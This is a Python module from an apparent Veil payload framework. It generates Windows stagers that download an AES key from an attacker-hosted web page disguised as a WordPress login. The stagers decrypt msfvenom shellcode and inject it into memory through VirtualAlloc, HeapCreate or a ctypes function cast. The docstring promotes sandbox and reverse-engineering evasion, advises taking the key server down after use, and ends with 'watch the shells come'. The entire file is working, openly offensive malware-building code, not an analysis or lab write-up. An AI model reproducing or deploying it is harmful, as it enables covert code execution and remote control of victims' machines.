# encoding=utf8
"""

This payload has AES encrypted shellcode stored on a webserver.  At runtime, the executable
uses the key from a HTML requet holding the key, using md5 to hash the html output and produce 
required 16 Byte key. Than injects it into memory, and executes it.

[*] Logic:
- HTTP Request on your hosted webpage:                                     <-----
    DOWN ----> Sleep and try to reach supplied webpage using HTTP response code 
    UP ----> Preform MD5 hash of HTML of webpage:
        MD5 ---> pass to decryption function:
            CalL Shellcode ----> Shellcode invojes callback: WIN 


[*] Benefits:
- Uses urllib2 to make get request against supplied server and returns the 
  HTML text for md5 hashing.
- Prevents Key being deployed with payload, preventing payload to run in sandbox
  if target server is taken offline during initial deployment.
- Once use of payload is over, take down webserver to prevent future infections
- Static and future dynamic RE is near impossible without proper data collection. 
- Proper web log monitoring will identify when webserver is burnt and crucial to 
  remove key to prevent future ability to RE binary. Defenders would need to capture 
  live memory to capture key.
- Devloped custom HTML login page to be hosted as key for payload



---------------------------------------
Based off AES encrypt module by @christruncer 

module by @KillSwitch-GUI: Alex Rymdeko-Harvey


"""

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = """AES Encrypted shellcode is decrypted upon HTTP request, injected into memory, and executed. 
        [*] Usage: Deploy webserver with cloned website, activate html page hosting key at specified URL. After building payload
        with Veil bring down hosted page. after delivery of binary stand up stagging server and watch the shells come."""
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        
        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
                                 "target_server" : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
                                 "html_file_path" : ["/root/Desktop/", "Set the output of HTML file name"]}

        
        
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
                target_server = str(self.required_options["target_server"][0])
                target_html_file = str(target_server.split('/')[-1]) 

                
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()

                # Define Random Variable Names for HTTP functions
                RandResponse = helpers.randomString()
                RandHttpKey = helpers.randomString()
                RandMD5 = helpers.randomString()
                RandKeyServer = helpers.randomString()
                RandSleep = helpers.randomString()

                # Define Random Variable Names for HTML Functions
                RandHttpstring = helpers.randomString()

                # Genrate Random HTML code for webserver to host key file
               
                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                html_data = """ 
                <!DOCTYPE html>
                <!--[if IE 8]>
                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                    <![endif]-->
                <!--[if !(IE 8) ]><!-->
                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
            
    
                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                    <p>
                        <label for="user_login">Username<br>
                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
                    </p>
                    <p>
                        <label for="user_pass">Password<br>
                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
                    </p>
                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
                    <p class="submit">
                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
                        <input name="redirect_to" value="http://www.google.com" type="hidden">
                        <input name="testcookie" value="1" type="hidden">
                    </p>
                    </form>

                <p id="nav">
                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
                </p>


                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
    
                    </div>
                   
                        <div class="clear"></div>
    
    
                    </body></html>
                """
                html_data += '<!--'+ RandHttpstring +'-->'
                html_data = str(html_data)
                f.write(html_data)
                f.close()

                # encrypt the shellcode and grab the HTTP-Md5-Hex Key from new function
                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
        
                # Create Payload code
                PayloadCode =  'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'import time\n'
                PayloadCode += 'import md5\n'
                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
                # Define Target Server "Key hosting server"
                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                PayloadCode += 'while True:\n'
                PayloadCode += ' try:\n'
                # Open Target Server with HTTP GET request
                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
                # Check to see if server returns a 200 code or if not its most likely a 400 code
                PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                # Opening and requesting HTML from Target Server
                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
                PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                # Genrate MD5 hash of HTML on page
                PayloadCode += '   '+ RandMD5 +'.update('+ RandHttpKey +')\n'
                # Convert to 16 Byte Hex for AES functions
                PayloadCode += '   '+ RandHttpKey + ' = '+ RandMD5 +'.hexdigest()\n'
                # Convert to String for functions
                PayloadCode += '   '+ RandHttpKey + ' = str('+ RandHttpKey +')\n'
                # Break out to decryption
                PayloadCode += '   break\n'
                # At any point it fails you will be in sleep for supplied time
                PayloadCode += ' except URLError, e:\n'
                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
                PayloadCode += '  pass\n'
                # Execute Shellcode inject
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new('+ RandHttpKey +')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        elif self.required_options["inject_method"][0].lower() == "heap":
                target_server = str(self.required_options["target_server"][0])
                target_html_file = str(target_server.split('/')[-1])  
            
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()
    
                # Define Random Variable Names for HTTP functions
                RandResponse = helpers.randomString()
                RandHttpKey = helpers.randomString()
                RandMD5 = helpers.randomString()
                RandKeyServer = helpers.randomString()
                RandSleep = helpers.randomString()

                # Define Random Variable Names for HTML Functions
                RandHttpstring = helpers.randomString()

                # Genrate Random HTML code for webserver to host key file
               
                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                html_data = """ 
                <!DOCTYPE html>
                <!--[if IE 8]>
                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                    <![endif]-->
                <!--[if !(IE 8) ]><!-->
                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
            
    
                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                    <p>
                        <label for="user_login">Username<br>
                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
                    </p>
                    <p>
                        <label for="user_pass">Password<br>
                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
                    </p>
                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
                    <p class="submit">
                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
                        <input name="redirect_to" value="http://www.google.com" type="hidden">
                        <input name="testcookie" value="1" type="hidden">
                    </p>
                    </form>

                <p id="nav">
                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
                </p>


                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
    
                    </div>
                   
                        <div class="clear"></div>
    
    
                    </body></html>
                """
                html_data += '<!--'+ RandHttpstring +'-->'
                html_data = str(html_data)
                f.write(html_data)
                f.close()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
        
                # Create Payload code
                PayloadCode =  'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'import time\n'
                PayloadCode += 'import md5\n'
                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
                # Define Target Server "Key hosting server"
                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                PayloadCode += 'while True:\n'
                PayloadCode += ' try:\n'
                # Open Target Server with HTTP GET request
                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
                # Check to see if server returns a 200 code or if not its most likely a 400 code
                PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                # Opening and requesting HTML from Target Server
                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
                PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                # Genrate MD5 hash of HTML on page
                PayloadCode += '   '+ RandMD5 +'.update('+ RandHttpKey +')\n'
                # Convert to 16 Byte Hex for AES functions
                PayloadCode += '   '+ RandHttpKey + ' = '+ RandMD5 +'.hexdigest()\n'
                # Convert to String for functions
                PayloadCode += '   '+ RandHttpKey + ' = str('+ RandHttpKey +')\n'
                # Break out to decryption
                PayloadCode += '   break\n'
                # At any point it fails you will be in sleep for supplied time
                PayloadCode += ' except URLError, e:\n'
                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
                PayloadCode += '  pass\n'
                # Execute Shellcode inject
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["expire_payload"][0].lower() == "x":
                target_server = str(self.required_options["target_server"][0])
                target_html_file = str(target_server.split('/')[-1]) 
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
    
                # Define Random Variable Names for HTTP functions
                RandResponse = helpers.randomString()
                RandHttpKey = helpers.randomString()
                RandMD5 = helpers.randomString()
                RandKeyServer = helpers.randomString()
                RandSleep = helpers.randomString()

                # Define Random Variable Names for HTML Functions
                RandHttpstring = helpers.randomString()

                # Genrate Random HTML code for webserver to host key file
               
                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                html_data = """ 
                <!DOCTYPE html>
                <!--[if IE 8]>
                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                    <![endif]-->
                <!--[if !(IE 8) ]><!-->
                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
            
    
                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                    <p>
                        <label for="user_login">Username<br>
                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
                    </p>
                    <p>
                        <label for="user_pass">Password<br>
                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
                    </p>
                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
                    <p class="submit">
                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
                        <input name="redirect_to" value="http://www.google.com" type="hidden">
                        <input name="testcookie" value="1" type="hidden">
                    </p>
                    </form>

                <p id="nav">
                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
                </p>


                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
    
                    </div>
                   
                        <div class="clear"></div>
    
    
                    </body></html>
                """
                html_data += '<!--'+ RandHttpstring +'-->'
                html_data = str(html_data)
                f.write(html_data)
                f.close()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
        
                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'import time\n'
                PayloadCode += 'import md5\n'
                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                # Define Target Server "Key hosting server"
                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                PayloadCode += 'while True:\n'
                PayloadCode += ' try:\n'
                # Open Target Server with HTTP GET request
                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
                # Check to see if server returns a 200 code or if not its most likely a 400 code
                PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                # Opening and requesting HTML from Target Server
                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
                PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                # Genrate MD5 hash of HTML on page
                PayloadCode += '   '+ RandMD5 +'.update('+ RandHttpKey +')\n'
                # Convert to 16 Byte Hex for AES functions
                PayloadCode += '   '+ RandHttpKey + ' = '+ RandMD5 +'.hexdigest()\n'
                # Convert to String for functions
                PayloadCode += '   '+ RandHttpKey + ' = str('+ RandHttpKey +')\n'
                # Break out to decryption
                PayloadCode += '   break\n'
                # At any point it fails you will be in sleep for supplied time
                PayloadCode += ' except URLError, e:\n'
                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
                PayloadCode += '  pass\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
